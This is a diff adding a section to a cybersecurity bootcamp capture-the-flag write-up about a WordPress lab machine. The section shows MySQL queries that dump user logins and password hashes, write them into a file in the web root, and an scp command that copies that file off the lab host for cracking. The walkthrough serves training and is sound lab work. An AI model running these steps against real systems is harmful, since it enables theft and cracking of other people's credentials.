@@ -139,6 +139,34 @@ To get flag3, we go by visitting the wp-config to gain the credential of mySql d
 ![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/using_of_sql_query.png)
 
 ![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discover_flag_3.png)
+
+  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
+
+To get start with the flag4, we continue to search through the SQL database to find the user password hashes. We use the following query to identify the hashes.
+
+--> describe wp_users; --> select user_login, user_pass from wp_users; 
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discover_user_hash.png)
+
+- Next, we use the query to join the user and hash together.
+
+--> select concat_ws(':', user_login, user_pass) from wp_users:
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/join_two_user_and_hashes.png)
+
+- Now we export the user hashed into a file using this query.
+
+--> select concat_ws(':', user_login, user_pass) from wp_users into outfile '/var/www/html/user_hash.txt
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/hashes_export_to_michael.png)
+
+- Before we begin to crack the hashes, we have to download the file to the host machine using the command:
+
+```bash
+scp michael@192.168.1.110:/var/www/html/user_hash.txt
+```
+***scp command is a secure copy (remote file copy)***
+
       - _TODO: Identify the exploit used_
       
       - _TODO: Include the command run_
